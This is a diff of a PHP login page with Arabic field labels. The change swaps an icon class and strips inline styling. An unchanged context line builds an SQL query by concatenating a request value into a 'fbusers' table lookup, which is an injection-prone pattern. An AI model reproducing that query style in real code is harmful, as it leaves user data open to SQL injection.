@@ -10,7 +10,7 @@
 </style>
 <?php
 $st['login']="NLog";
-$icon = "fa-commenting-o" ;
+$icon = "commenting-o" ;
 $st['name']="البريد الالكترونى او الهاتف ";
 $st['pass']="رقم الموبيل ";
 $st['title']= "قم باختيار الدوله ثم اكتب رقم الهاتف  من دون كود الدوله ";
@@ -54,12 +54,7 @@ $cus =  Sel("fbusers"," where username='".isv("user")."' ");
  <div class="container">
  <div class="row">
  <form id="form" action="../login.html" method="post">
-	   <div class="addpost col s12 m12" style="    left: 0;
-    position: absolute;
-    top: 74px;
-    right: 0;
-    margin: auto;
-        max-width: 485px;    direction: rtl;">
+	   <div class="addpost col s12 m12" style="">
         <div class="col s12 center bold" style="<?=$st['color']?>" >
         <i class="fa fa-<?=$icon?> fa-5x RA" style="<?=$st['color']?>" aria-hidden="true"></i>
         </div>
